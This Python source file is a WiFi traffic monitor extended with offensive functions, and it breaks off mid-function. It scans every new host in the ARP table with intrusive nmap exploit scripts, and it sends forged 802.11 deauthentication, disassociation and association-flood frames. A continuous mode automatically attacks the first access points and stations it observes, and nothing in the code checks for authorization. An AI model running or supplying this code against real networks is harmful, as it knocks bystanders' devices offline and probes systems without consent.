#!/usr/bin/env python3
import time
import math
import logging
import requests
import smtplib
from email.mime.text import MIMEText
from logging.handlers import SysLogHandler
from collections import Counter
import argparse
import threading
import subprocess
import os
import re
import json
from datetime import datetime
import ipaddress

import pandas as pd
import pyshark
from scapy.all import sniff, Raw, Dot11, Dot11Auth, Dot11AssoReq, Dot11AssoResp, Dot11Disas, Dot11Deauth, Dot11ProbeReq, Dot11ProbeResp, Dot11Beacon, RadioTap, sendp
import random

# --- Config ---
WINDOW_SEC = 5
PACKET_THRESHOLD = 500
UNIQUE_MAC_THRESHOLD = 50
MGMT_FRAME_THRESHOLD = 0.5
ENTROPY_THRESHOLD = 7.5

ALERT_EMAIL = None
ALERT_WEBHOOK = None
ALERT_SYSLOG = "/dev/log"

OUI_DB = {}
packets_buffer = []

stations = set()
access_points = set()

# --- Port Scanning Configuration ---
SCAN_REPORTS_DIR = "~/5t3wstuff/5t3wportscans"
SCANNED_IPS_FILE = os.path.join(SCAN_REPORTS_DIR, "scanned_ips.json")
NMAP_ARGS = ["-sV", "-sC", "-O", "--script=vuln", "-T4"]  # Comprehensive scan

# --- Vulnerability Scanning Configuration ---
VULN_REPORTS_DIR = "~/5t3wstuff/5t3wvulns"
VULN_SCANNED_IPS_FILE = os.path.join(VULN_REPORTS_DIR, "vuln_scanned_ips.json")
VULN_SUMMARY_FILE = os.path.join(VULN_REPORTS_DIR, "vulnerability_summary.json")
NMAP_VULN_ARGS = [
    "--script", "vuln,exploit,malware,intrusive,auth",
    "--script-args", "unsafe=1",
    "-sV", "-sC", "-T4", "--max-retries", "2"
]  # Comprehensive vulnerability scan

# --- Association Attack Configuration ---
ASSOCIATION_ATTACK_DIR = "~/5t3wstuff/5t3wattacks"
ASSOCIATION_TARGETS_FILE = os.path.join(ASSOCIATION_ATTACK_DIR, "attack_targets.json")
ASSOCIATION_LOGS_FILE = os.path.join(ASSOCIATION_ATTACK_DIR, "attack_logs.json")

# Attack parameters
DEFAULT_ATTACK_INTERVAL = 5  # seconds between attacks
DEFAULT_ATTACK_COUNT = 10    # number of frames per attack
SUPPORTED_RATES = [0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24]  # 802.11 supported rates

# --- ARP Discovery ---
def get_arp_table():
    """Get all IP addresses from ARP table using 'arp -a' command"""
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            logging.error(f"ARP command failed: {result.stderr}")
            return []
        
        ip_addresses = []
        # Parse ARP output format: hostname (ip_address) at mac_address [ether] on interface
        for line in result.stdout.split('\n'):
            if line.strip():
                # Extract IP address using regex
                ip_match = re.search(r'\(([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\)', line)
                if ip_match:
                    ip = ip_match.group(1)
                    # Validate IP address
                    try:
                        ipaddress.ip_address(ip)
                        ip_addresses.append(ip)
                    except ValueError:
                        continue
        
        logging.info(f"Found {len(ip_addresses)} IP addresses in ARP table")
        return list(set(ip_addresses))  # Remove duplicates
    
    except subprocess.TimeoutExpired:
        logging.error("ARP command timed out")
        return []
    except Exception as e:
        logging.error(f"Error getting ARP table: {e}")
        return []

def load_scanned_ips():
    """Load previously scanned IPs from file"""
    try:
        if os.path.exists(SCANNED_IPS_FILE):
            with open(SCANNED_IPS_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get('scanned_ips', []))
        return set()
    except Exception as e:
        logging.error(f"Error loading scanned IPs: {e}")
        return set()

def save_scanned_ips(scanned_ips):
    """Save scanned IPs to file"""
    try:
        os.makedirs(SCAN_REPORTS_DIR, exist_ok=True)
        with open(SCANNED_IPS_FILE, 'w') as f:
            json.dump({
                'scanned_ips': list(scanned_ips),
                'last_updated': datetime.now().isoformat()
            }, f, indent=2)
    except Exception as e:
        logging.error(f"Error saving scanned IPs: {e}")

def get_new_clients():
    """Get list of new IP addresses that haven't been scanned yet"""
    current_ips = set(get_arp_table())
    scanned_ips = load_scanned_ips()
    new_ips = current_ips - scanned_ips
    
    if new_ips:
        logging.info(f"Found {len(new_ips)} new clients: {', '.join(new_ips)}")
    else:
        logging.info("No new clients found")
    
    return list(new_ips)

def run_nmap_scan(target_ip):
    """Run nmap scan on target IP and return results"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = os.path.join(SCAN_REPORTS_DIR, f"scan_{target_ip}_{timestamp}.txt")
        
        cmd = ['nmap'] + NMAP_ARGS + ['-oN', output_file, target_ip]
        logging.info(f"Starting nmap scan on {target_ip}")
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)  # 10 min timeout
        
        if result.returncode == 0:
            logging.info(f"Scan completed for {target_ip}, report saved to {output_file}")
            return output_file, result.stdout
        else:
            logging.error(f"Nmap scan failed for {target_ip}: {result.stderr}")
            return None, None
            
    except subprocess.TimeoutExpired:
        logging.error(f"Nmap scan timed out for {target_ip}")
        return None, None
    except Exception as e:
        logging.error(f"Error running nmap scan on {target_ip}: {e}")
        return None, None

def scan_new_clients():
    """Main function to scan new clients found via ARP"""
    logging.info("Starting port scan discovery process...")
    
    # Create output directory
    os.makedirs(SCAN_REPORTS_DIR, exist_ok=True)
    
    # Get new clients
    new_clients = get_new_clients()
    if not new_clients:
        return
    
    # Load existing scanned IPs
    scanned_ips = load_scanned_ips()
    
    # Scan each new client
    for ip in new_clients:
        logging.info(f"Scanning {ip}...")
        output_file, scan_results = run_nmap_scan(ip)
        
        if output_file:
            # Mark as scanned
            scanned_ips.add(ip)
            
            # Save updated scanned IPs list
            save_scanned_ips(scanned_ips)
            
            # Log summary
            if scan_results:
                open_ports = len([line for line in scan_results.split('\n') if '/tcp' in line and 'open' in line])
                logging.info(f"Scan complete for {ip}: {open_ports} open ports found")
    
    logging.info("Port scan discovery process completed")

# --- Vulnerability Scanning Functions ---
def load_vuln_scanned_ips():
    """Load previously vulnerability-scanned IPs from file"""
    try:
        if os.path.exists(VULN_SCANNED_IPS_FILE):
            with open(VULN_SCANNED_IPS_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get('vuln_scanned_ips', []))
        return set()
    except Exception as e:
        logging.error(f"Error loading vulnerability scanned IPs: {e}")
        return set()

def save_vuln_scanned_ips(scanned_ips):
    """Save vulnerability-scanned IPs to file"""
    try:
        os.makedirs(VULN_REPORTS_DIR, exist_ok=True)
        with open(VULN_SCANNED_IPS_FILE, 'w') as f:
            json.dump({
                'vuln_scanned_ips': list(scanned_ips),
                'last_updated': datetime.now().isoformat()
            }, f, indent=2)
    except Exception as e:
        logging.error(f"Error saving vulnerability scanned IPs: {e}")

def run_vulnerability_scan(target_ip):
    """Run comprehensive vulnerability scan on target IP"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = os.path.join(VULN_REPORTS_DIR, f"vuln_scan_{target_ip}_{timestamp}.txt")
        xml_output_file = os.path.join(VULN_REPORTS_DIR, f"vuln_scan_{target_ip}_{timestamp}.xml")
        
        cmd = ['nmap'] + NMAP_VULN_ARGS + ['-oN', output_file, '-oX', xml_output_file, target_ip]
        logging.info(f"Starting vulnerability scan on {target_ip}")
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=1200)  # 20 min timeout
        
        if result.returncode == 0:
            logging.info(f"Vulnerability scan completed for {target_ip}")
            
            # Parse and categorize vulnerabilities
            vulnerabilities = parse_vulnerability_results(result.stdout, target_ip)
            
            # Save structured vulnerability data
            vuln_json_file = os.path.join(VULN_REPORTS_DIR, f"vuln_data_{target_ip}_{timestamp}.json")
            with open(vuln_json_file, 'w') as f:
                json.dump({
                    'target': target_ip,
                    'scan_time': datetime.now().isoformat(),
                    'vulnerabilities': vulnerabilities,
                    'scan_command': ' '.join(cmd)
                }, f, indent=2)
            
            return output_file, vulnerabilities
        else:
            logging.error(f"Vulnerability scan failed for {target_ip}: {result.stderr}")
            return None, []
            
    except subprocess.TimeoutExpired:
        logging.error(f"Vulnerability scan timed out for {target_ip}")
        return None, []
    except Exception as e:
        logging.error(f"Error running vulnerability scan on {target_ip}: {e}")
        return None, []

def parse_vulnerability_results(scan_output, target_ip):
    """Parse nmap vulnerability scan output and categorize findings"""
    vulnerabilities = []
    current_vuln = None
    
    lines = scan_output.split('\n')
    for line in lines:
        line = line.strip()
        
        # Look for vulnerability script results
        if '|' in line and any(keyword in line.lower() for keyword in 
                               ['vuln', 'cve', 'exploit', 'vulnerable', 'security']):
            
            # Extract CVE numbers
            cve_matches = re.findall(r'CVE-\d{4}-\d{4,}', line)
            
            # Determine severity based on keywords
            severity = 'info'
            if any(keyword in line.lower() for keyword in ['critical', 'high']):
                severity = 'critical'
            elif any(keyword in line.lower() for keyword in ['medium', 'moderate']):
                severity = 'medium'
            elif any(keyword in line.lower() for keyword in ['low', 'minor']):
                severity = 'low'
            elif any(keyword in line.lower() for keyword in ['exploit', 'remote code', 'rce']):
                severity = 'critical'
            
            vuln_entry = {
                'target': target_ip,
                'description': line,
                'severity': severity,
                'cves': cve_matches,
                'timestamp': datetime.now().isoformat()
            }
            
            vulnerabilities.append(vuln_entry)
    
    return vulnerabilities

def update_vulnerability_summary(new_vulnerabilities):
    """Update the master vulnerability summary file"""
    try:
        # Load existing summary
        summary_data = {'targets': {}, 'last_updated': None, 'total_vulnerabilities': 0}
        if os.path.exists(VULN_SUMMARY_FILE):
            with open(VULN_SUMMARY_FILE, 'r') as f:
                summary_data = json.load(f)
        
        # Update with new vulnerabilities
        for vuln in new_vulnerabilities:
            target = vuln['target']
            if target not in summary_data['targets']:
                summary_data['targets'][target] = {
                    'critical': 0, 'medium': 0, 'low': 0, 'info': 0,
                    'last_scan': None, 'vulnerabilities': []
                }
            
            summary_data['targets'][target]['vulnerabilities'].append(vuln)
            summary_data['targets'][target][vuln['severity']] += 1
            summary_data['targets'][target]['last_scan'] = vuln['timestamp']
        
        # Update totals
        summary_data['total_vulnerabilities'] = sum(
            len(target_data['vulnerabilities']) 
            for target_data in summary_data['targets'].values()
        )
        summary_data['last_updated'] = datetime.now().isoformat()
        
        # Save updated summary
        with open(VULN_SUMMARY_FILE, 'w') as f:
            json.dump(summary_data, f, indent=2)
            
        logging.info(f"Updated vulnerability summary: {summary_data['total_vulnerabilities']} total vulnerabilities across {len(summary_data['targets'])} targets")
        
    except Exception as e:
        logging.error(f"Error updating vulnerability summary: {e}")

def get_new_vuln_targets():
    """Get list of IPs that need vulnerability scanning"""
    current_ips = set(get_arp_table())
    vuln_scanned_ips = load_vuln_scanned_ips()
    new_targets = current_ips - vuln_scanned_ips
    
    if new_targets:
        logging.info(f"Found {len(new_targets)} new targets for vulnerability scanning: {', '.join(new_targets)}")
    else:
        logging.info("No new targets found for vulnerability scanning")
    
    return list(new_targets)

def scan_vulnerabilities():
    """Main function to scan for vulnerabilities on new targets"""
    logging.info("Starting vulnerability scanning process...")
    
    # Create output directory
    os.makedirs(VULN_REPORTS_DIR, exist_ok=True)
    
    # Get new targets
    new_targets = get_new_vuln_targets()
    if not new_targets:
        return
    
    # Load existing scanned IPs
    vuln_scanned_ips = load_vuln_scanned_ips()
    all_vulnerabilities = []
    
    # Scan each new target
    for ip in new_targets:
        logging.info(f"Vulnerability scanning {ip}...")
        output_file, vulnerabilities = run_vulnerability_scan(ip)
        
        if output_file:
            # Mark as scanned
            vuln_scanned_ips.add(ip)
            
            # Collect vulnerabilities
            all_vulnerabilities.extend(vulnerabilities)
            
            # Save updated scanned IPs list
            save_vuln_scanned_ips(vuln_scanned_ips)
            
            # Log summary
            vuln_count = len(vulnerabilities)
            critical_count = len([v for v in vulnerabilities if v['severity'] == 'critical'])
            logging.info(f"Vulnerability scan complete for {ip}: {vuln_count} vulnerabilities found ({critical_count} critical)")
    
    # Update master summary
    if all_vulnerabilities:
        update_vulnerability_summary(all_vulnerabilities)
    
    logging.info("Vulnerability scanning process completed")

def continuous_vulnerability_scanning(interval_minutes=60):
    """Continuously scan for vulnerabilities at specified interval"""
    logging.info(f"Starting continuous vulnerability scanning (interval: {interval_minutes} minutes)")
    
    while True:
        try:
            scan_vulnerabilities()
            time.sleep(interval_minutes * 60)
        except KeyboardInterrupt:
            logging.info("Continuous vulnerability scanning stopped by user")
            break
        except Exception as e:
            logging.error(f"Error in continuous vulnerability scanning: {e}")
            time.sleep(60)  # Wait 1 minute before retrying

def generate_vulnerability_report():
    """Generate a comprehensive vulnerability report"""
    try:
        if not os.path.exists(VULN_SUMMARY_FILE):
            logging.info("No vulnerability data found")
            return
        
        with open(VULN_SUMMARY_FILE, 'r') as f:
            summary_data = json.load(f)
        
        report_file = os.path.join(VULN_REPORTS_DIR, f"vulnerability_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        
        with open(report_file, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("5T3W VULNERABILITY SCAN REPORT\n")
            f.write("=" * 60 + "\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total Targets Scanned: {len(summary_data['targets'])}\n")
            f.write(f"Total Vulnerabilities: {summary_data['total_vulnerabilities']}\n")
            f.write("\n" + "=" * 60 + "\n")
            f.write("VULNERABILITY SUMMARY BY TARGET\n")
            f.write("=" * 60 + "\n")
            
            for target, data in summary_data['targets'].items():
                f.write(f"\nTarget: {target}\n")
                f.write(f"Last Scan: {data['last_scan']}\n")
                f.write(f"Critical: {data['critical']}, Medium: {data['medium']}, Low: {data['low']}, Info: {data['info']}\n")
                f.write("-" * 40 + "\n")
                
                for vuln in data['vulnerabilities']:
                    f.write(f"[{vuln['severity'].upper()}] {vuln['description']}\n")
                    if vuln['cves']:
                        f.write(f"CVEs: {', '.join(vuln['cves'])}\n")
                    f.write(f"Timestamp: {vuln['timestamp']}\n\n")
        
        logging.info(f"Vulnerability report generated: {report_file}")
        return report_file
        
    except Exception as e:
        logging.error(f"Error generating vulnerability report: {e}")
        return None

# --- Association Attack Functions ---
def build_authentication_frame(destination_mac, source_mac, bssid, sequence_num=None):
    """Build 802.11 authentication frame"""
    if sequence_num is None:
        sequence_num = random.randint(1, 4095)
    
    frame = RadioTap() / Dot11(
        type=0, subtype=11,  # Management frame, Authentication
        addr1=destination_mac,
        addr2=source_mac,
        addr3=bssid,
        SC=sequence_num << 4
    ) / Dot11Auth(
        algo=0,  # Open System
        seqnum=1,  # Authentication sequence number
        status=0  # Success
    )
    return frame

def build_association_request(ap_mac, client_mac, ssid, bssid=None, sequence_num=None):
    """Build 802.11 association request frame"""
    if bssid is None:
        bssid = ap_mac
    if sequence_num is None:
        sequence_num = random.randint(1, 4095)
    
    # Import Dot11Elt here to avoid import issues
    from scapy.all import Dot11Elt
    
    frame = RadioTap() / Dot11(
        type=0, subtype=0,  # Management frame, Association Request
        addr1=ap_mac,
        addr2=client_mac,
        addr3=bssid,
        SC=sequence_num << 4
    ) / Dot11AssoReq(
        cap=0x1104,  # Capabilities
        listen_interval=10
    ) / Dot11Elt(ID="SSID", info=ssid) / Dot11Elt(ID="Rates", info=bytes(SUPPORTED_RATES))
    return frame

def build_association_response(client_mac, ap_mac, bssid=None, sequence_num=None):
    """Build 802.11 association response frame"""
    if bssid is None:
        bssid = ap_mac
    if sequence_num is None:
        sequence_num = random.randint(1, 4095)
    
    # Import Dot11Elt here to avoid import issues
    from scapy.all import Dot11Elt
    
    frame = RadioTap() / Dot11(
        type=0, subtype=1,  # Management frame, Association Response
        addr1=client_mac,
        addr2=ap_mac,
        addr3=bssid,
        SC=sequence_num << 4
    ) / Dot11AssoResp(
        cap=0x1104,
        status=0,  # Success
        AID=1
    ) / Dot11Elt(ID="Rates", info=bytes(SUPPORTED_RATES))
    return frame

def build_disassociation_frame(destination_mac, source_mac, bssid=None, reason=8, sequence_num=None):
    """Build 802.11 disassociation frame"""
    if bssid is None:
        bssid = source_mac
    if sequence_num is None:
        sequence_num = random.randint(1, 4095)
    
    frame = RadioTap() / Dot11(
        type=0, subtype=10,  # Management frame, Disassociation
        addr1=destination_mac,
        addr2=source_mac,
        addr3=bssid,
        SC=sequence_num << 4
    ) / Dot11Disas(reason=reason)
    return frame

def build_deauthentication_frame(destination_mac, source_mac, bssid=None, reason=7, sequence_num=None):
    """Build 802.11 deauthentication frame"""
    if bssid is None:
        bssid = source_mac
    if sequence_num is None:
        sequence_num = random.randint(1, 4095)
    
    frame = RadioTap() / Dot11(
        type=0, subtype=12,  # Management frame, Deauthentication
        addr1=destination_mac,
        addr2=source_mac,
        addr3=bssid,
        SC=sequence_num << 4
    ) / Dot11Deauth(reason=reason)
    return frame

def build_probe_request(source_mac, ssid="", bssid="ff:ff:ff:ff:ff:ff", sequence_num=None):
    """Build 802.11 probe request frame"""
    if sequence_num is None:
        sequence_num = random.randint(1, 4095)
    
    # Import Dot11Elt here to avoid import issues
    from scapy.all import Dot11Elt
    
    frame = RadioTap() / Dot11(
        type=0, subtype=4,  # Management frame, Probe Request
        addr1=bssid,  # Broadcast
        addr2=source_mac,
        addr3=bssid,
        SC=sequence_num << 4
    ) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info=ssid) / Dot11Elt(ID="Rates", info=bytes(SUPPORTED_RATES))
    return frame

def load_attack_targets():
    """Load attack targets from file"""
    try:
        if os.path.exists(ASSOCIATION_TARGETS_FILE):
            with open(ASSOCIATION_TARGETS_FILE, 'r') as f:
                return json.load(f)
        return {"targets": [], "last_updated": None}
    except Exception as e:
        logging.error(f"Error loading attack targets: {e}")
        return {"targets": [], "last_updated": None}

def save_attack_targets(targets_data):
    """Save attack targets to file"""
    try:
        os.makedirs(ASSOCIATION_ATTACK_DIR, exist_ok=True)
        with open(ASSOCIATION_TARGETS_FILE, 'w') as f:
            json.dump(targets_data, f, indent=2)
    except Exception as e:
        logging.error(f"Error saving attack targets: {e}")

def log_attack_activity(attack_type, target_mac, source_mac, status, details=""):
    """Log attack activity for audit trail"""
    try:
        os.makedirs(ASSOCIATION_ATTACK_DIR, exist_ok=True)
        
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "attack_type": attack_type,
            "target_mac": target_mac,
            "source_mac": source_mac,
            "status": status,
            "details": details
        }
        
        # Load existing logs
        logs = []
        if os.path.exists(ASSOCIATION_LOGS_FILE):
            with open(ASSOCIATION_LOGS_FILE, 'r') as f:
                logs = json.load(f)
        
        # Add new log entry
        logs.append(log_entry)
        
        # Keep only last 1000 entries
        if len(logs) > 1000:
            logs = logs[-1000:]
        
        # Save updated logs
        with open(ASSOCIATION_LOGS_FILE, 'w') as f:
            json.dump(logs, f, indent=2)
            
    except Exception as e:
        logging.error(f"Error logging attack activity: {e}")

def perform_deauth_attack(interface, target_mac, ap_mac, count=10):
    """Perform deauthentication attack"""
    try:
        logging.info(f"Starting deauth attack: {target_mac} <-> {ap_mac}")
        
        source_mac = get_interface_mac(interface)
        frames_sent = 0
        
        for i in range(count):
            # Deauth from AP to client
            frame1 = build_deauthentication_frame(target_mac, ap_mac, ap_mac)
            # Deauth from client to AP  
            frame2 = build_deauthentication_frame(ap_mac, target_mac, ap_mac)
            
            try:
                sendp(frame1, iface=interface, verbose=False)
                sendp(frame2, iface=interface, verbose=False)
                frames_sent += 2
                time.sleep(0.1)
            except Exception as e:
                logging.error(f"Error sending deauth frame {i}: {e}")
        
        log_attack_activity("deauth", target_mac, source_mac, "completed", 
                          f"Sent {frames_sent} deauth frames")
        logging.info(f"Deauth attack completed: {frames_sent} frames sent")
        return True
        
    except Exception as e:
        logging.error(f"Deauth attack failed: {e}")
        log_attack_activity("deauth", target_mac, source_mac, "failed", str(e))
        return False

def perform_disassoc_attack(interface, target_mac, ap_mac, count=10):
    """Perform disassociation attack"""
    try:
        logging.info(f"Starting disassoc attack: {target_mac} <-> {ap_mac}")
        
        source_mac = get_interface_mac(interface)
        frames_sent = 0
        
        for i in range(count):
            # Disassoc from AP to client
            frame1 = build_disassociation_frame(target_mac, ap_mac, ap_mac)
            # Disassoc from client to AP
            frame2 = build_disassociation_frame(ap_mac, target_mac, ap_mac)
            
            try:
                sendp(frame1, iface=interface, verbose=False)
                sendp(frame2, iface=interface, verbose=False)
                frames_sent += 2
                time.sleep(0.1)
            except Exception as e:
                logging.error(f"Error sending disassoc frame {i}: {e}")
        
        log_attack_activity("disassoc", target_mac, source_mac, "completed",
                          f"Sent {frames_sent} disassoc frames")
        logging.info(f"Disassoc attack completed: {frames_sent} frames sent")
        return True
        
    except Exception as e:
        logging.error(f"Disassoc attack failed: {e}")
        log_attack_activity("disassoc", target_mac, source_mac, "failed", str(e))
        return False

def perform_association_flood(interface, ap_mac, ssid, count=50):
    """Perform association request flood attack"""
    try:
        logging.info(f"Starting association flood attack on {ap_mac} ({ssid})")
        
        source_mac = get_interface_mac(interface)
        frames_sent = 0
        
        for i in range(count):
            # Generate random client MAC
            fake_client = "02:00:00:{:02x}:{:02x}:{:02x}".format(
                random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)
            )
            
            try:
                # Send auth frame first
                auth_frame = build_authentication_frame(ap_mac, fake_client, ap_mac)
                sendp(auth_frame, iface=interface, verbose=False)
                
                # Send association request
                assoc_frame = build_association_request(ap_mac, fake_client, ssid)
                sendp(assoc_frame, iface=interface, verbose=False)
                
                frames_sent += 2
                time.sleep(0.05)
                
            except Exception as e:
                logging.error(f"Error sending association frame {i}: {e}")
        
        log_attack_activity("assoc_flood", ap_mac, source_mac, "completed",
                          f"Sent {frames_sent} association frames")
        logging.info(f"Association flood completed: {frames_sent} frames sent")
        return True
        
    except Exception as e:
        logging.error(f"Association flood failed: {e}")
        log_attack_activity("assoc_flood", ap_mac, source_mac, "failed", str(e))
        return False

def get_interface_mac(interface):
    """Get MAC address of interface"""
    try:
        import netifaces
        return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
    except:
        # Fallback method
        try:
            result = subprocess.run(['ip', 'link', 'show', interface], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'link/ether' in line:
                    return line.split()[1]
        except:
            pass
        return "02:00:00:00:00:01"  # Default fallback MAC

def discover_attack_targets():
    """Discover potential attack targets from monitoring data"""
    targets = []
    
    # Use existing station and AP tracking
    for ap in access_points:
        if ap and ap != "Unknown":
            targets.append({
                "type": "ap",
                "mac": ap,
                "ssid": "",  # Would need to track this separately
                "channel": 0,  # Would need to track this
                "signal": 0,
                "last_seen": datetime.now().isoformat()
            })
    
    for station in stations:
        if station and station != "Unknown":
            targets.append({
                "type": "station", 
                "mac": station,
                "associated_ap": "",  # Would need to track this
                "last_seen": datetime.now().isoformat()
            })
    
    return targets

def run_association_attacks(interface, attack_types=None, target_mac=None, ap_mac=None, ssid="", count=10):
    """Run association-based attacks"""
    if attack_types is None:
        attack_types = ["deauth"]
    
    logging.info(f"Starting association attacks: {', '.join(attack_types)}")
    
    success_count = 0
    total_attacks = len(attack_types)
    
    for attack_type in attack_types:
        try:
            if attack_type == "deauth" and target_mac and ap_mac:
                success = perform_deauth_attack(interface, target_mac, ap_mac, count)
            elif attack_type == "disassoc" and target_mac and ap_mac:
                success = perform_disassoc_attack(interface, target_mac, ap_mac, count)
            elif attack_type == "assoc_flood" and ap_mac:
                success = perform_association_flood(interface, ap_mac, ssid, count)
            else:
                logging.warning(f"Skipping {attack_type}: missing required parameters")
                continue
                
            if success:
                success_count += 1
                
            # Wait between attacks
            time.sleep(2)
            
        except Exception as e:
            logging.error(f"Attack {attack_type} failed: {e}")
    
    logging.info(f"Association attacks completed: {success_count}/{total_attacks} successful")
    return success_count > 0

def continuous_association_attacks(interface, interval_minutes=10, attack_types=None):
    """Continuously run association attacks at specified interval"""
    if attack_types is None:
        attack_types = ["deauth"]
        
    logging.info(f"Starting continuous association attacks (interval: {interval_minutes} minutes)")
    
    while True:
        try:
            # Discover current targets
            targets = discover_attack_targets()
            
            if not targets:
                logging.info("No attack targets found, waiting...")
                time.sleep(interval_minutes * 60)
                continue
            
            # Filter for APs and stations
            aps = [t for t in targets if t["type"] == "ap"]
            stations = [t for t in targets if t["type"] == "station"]
            
            # Perform attacks on discovered targets
            for ap in aps[:3]:  # Limit to first 3 APs
                for station in stations[:5]:  # Limit to first 5 stations
                    run_association_attacks(
                        interface, 
                        attack_types=attack_types,
                        target_mac=station["mac"],
                        ap_mac=ap["mac"],
                        count=5  # Reduced count for continuous mode
                    )
                    time.sleep(5)  # Wait between target pairs
            
            time.sleep(interval_minutes * 60)
            
        except KeyboardInterrupt:
            logging.info("Continuous association attacks stopped by user")
            break
        except Exception as e:
            logging.error(f"Error in continuous association attacks: {e}")
            time.sleep(60)

def continuous_port_scanning(interval_minutes=30):
    """Continuously scan for new clients at specified interval"""
    logging.info(f"Starting continuous port scanning (interval: {interval_minutes} minutes)")
    
    while True:
        try:
            scan_new_clients()
            time.sleep(interval_minutes * 60)
        except KeyboardInterrupt:
            logging.info("Continuous port scanning stopped by user")
            break
        except Exception as e:
            logging.error(f"Error in continuous scanning: {e}")
            time.sleep(60)  # Wait 1 minute before retrying

# --- OUI Vendor Lookup ---
def load_oui_db(path="oui.txt"):
    try:
        with open(path) as f:
            for line in f:
                if "(hex)" in line:
                    prefix, vendor = line.split("(hex)")
                    prefix = prefix.strip().replace("-", ":")
                    OUI_DB[prefix] = vendor.strip()
        logging.info(f"Loaded {len(OUI_DB)} OUI entries")
    except FileNotFoundError:
        logging.warning("OUI DB not found, vendor lookup disabled")

def lookup_vendor(mac):
    if not mac:
        return "Unknown"
    prefix = mac.upper()[0:8]
    return OUI_DB.get(prefix, "Unknown")

# --- Entropy ---
def shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    counter = Counter(data)
    length = len(data)
    return -sum((count/length) * math.log2(count/length) for count in counter.values())

# --- Alerts ---
def send_alert(msg: str):
    logging.warning(msg)
    if ALERT_EMAIL:
        try:
            email = MIMEText(msg)
            email["Subject"] = "WiFi Monitor Alert"
            email["From"] = ALERT_EMAIL
            email["To"] = ALERT_EMAIL
            with smtplib.SMTP("localhost") as server:
                server.sendmail(ALERT_EMAIL, [ALERT_EMAIL], email.as_string())
        except Exception as e:
            logging.error(f"Email alert failed: {e}")

    if ALERT_WEBHOOK:
        try:
            requests.post(ALERT_WEBHOOK, json={"alert": msg})
        except Exception as e:
            logging.error(f"Webhook alert failed: {e}")

    if ALERT_SYSLOG:
        try:
            syslog = SysLogHandler(address=ALERT_SYSLOG)
            syslog.emit(logging.LogRecord("wifi-monitor", logging.WARNING, "", 0, msg, None, None))
        except Exception as e:
            logging.error(f"Syslog alert failed: {e}")

# --- Verbose / sticky logging ---
def verbose_log(pkt_dict, silent=False):
    if silent:
        return
    src = pkt_dict.get("src", "Unknown")
    dst = pkt_dict.get("dst", "Unknown")
    frame_type = pkt_dict.get("frame_type", "Unknown")
    subtype = pkt_dict.get("subtype", "Unknown")
    ssid = pkt_dict.get("ssid", "")
    log_msg = f"[{frame_type.upper()}:{subtype}] {src} -> {dst}"
    if ssid:
        log_msg += f" SSID:{ssid}"
    logging.info(log_msg)

    # Track stations and APs
    if frame_type == "mgmt":
        if subtype == "probe-req":
            stations.add(src)
        elif subtype == "beacon":
            access_points.add(src)

# --- Capture with Scapy ---
def scapy_handler(pkt, silent=False):
    try:
        ts = time.time()
        src = pkt.addr2 if hasattr(pkt, "addr2") else None
        dst = pkt.addr1 if hasattr(pkt, "addr1") else None
        length = len(pkt)
        payload = bytes(pkt[Raw]) if Raw in pkt else b""

        pkt_dict = {
            "timestamp": ts,
            "src": src,
            "dst": dst,
            "length": length,
            "entropy": shannon_entropy(payload),
            "frame_type": "unknown",
            "subtype": "unknown",
            "ssid": ""
        }

        if pkt.haslayer("Dot11"):
            fc_type = int(pkt.type)
            fc_subtype = int(pkt.subtype)
            if fc_type == 0:
                pkt_dict["frame_type"] = "mgmt"
                if fc_subtype == 4:
                    pkt_dict["subtype"] = "probe-req"
                    pkt_dict["ssid"] = pkt.info.decode(errors="ignore") if hasattr(pkt, "info") else ""
                elif fc_subtype == 8:
                    pkt_dict["subtype"] = "beacon"
                    pkt_dict["ssid"] = pkt.info.decode(errors="ignore") if hasattr(pkt, "info") else ""
                else:
                    pkt_dict["subtype"] = str(fc_subtype)
            elif fc_type == 1:
                pkt_dict["frame_type"] = "ctrl"
                pkt_dict["subtype"] = str(fc_subtype)
            else:
                pkt_dict["frame_type"] = "data"
                pkt_dict["subtype"] = str(fc_subtype)

        packets_buffer.append(pkt_dict)
        verbose_log(pkt_dict, silent=silent)
    except Exception as e:
        logging.debug(f"scapy_handler error: {e}")

# --- Sticky summary ---
def print_summary_sticky(total, unique_macs, avg_entropy, mgmt_ratio, stations, access_points, silent=False):
    if silent:
        return
    summary_lines = [
        f"--- Window Summary ---",
        f"Packets: {total}, Unique MACs: {unique_macs}, Avg Entropy: {avg_entropy:.2f}",
        f"Management Ratio: {mgmt_ratio:.2%}",
        f"Stations observed: {len(stations)}, APs observed: {len(access_points)}",
        f"Stations: {stations}",
        f"Access Points (MACs): {access_points}"
    ]
    print("\033[6A", end="")
    print("\033[J", end="")
    for line in summary_lines:
        print(line)

# --- Window analysis ---
def analyze_window(df: pd.DataFrame, silent=False):
    if df.empty:
        return

    total = len(df)
    unique_macs = df["src"].nunique()
    avg_entropy = df["entropy"].mean()
    mgmt_count = (df.get("frame_type") == "mgmt").sum() if "frame_type" in df else 0
    mgmt_ratio = mgmt_count / total if total > 0 else 0

    if total > PACKET_THRESHOLD:
        send_alert(f"High traffic: {total} packets in {WINDOW_SEC}s")
    if unique_macs > UNIQUE_MAC_THRESHOLD:
        send_alert(f"Too many unique MACs: {unique_macs}")
    if mgmt_ratio > MGMT_FRAME_THRESHOLD:
        send_alert(f"Suspicious management traffic: {mgmt_ratio:.2%}")
    if avg_entropy > ENTROPY_THRESHOLD:
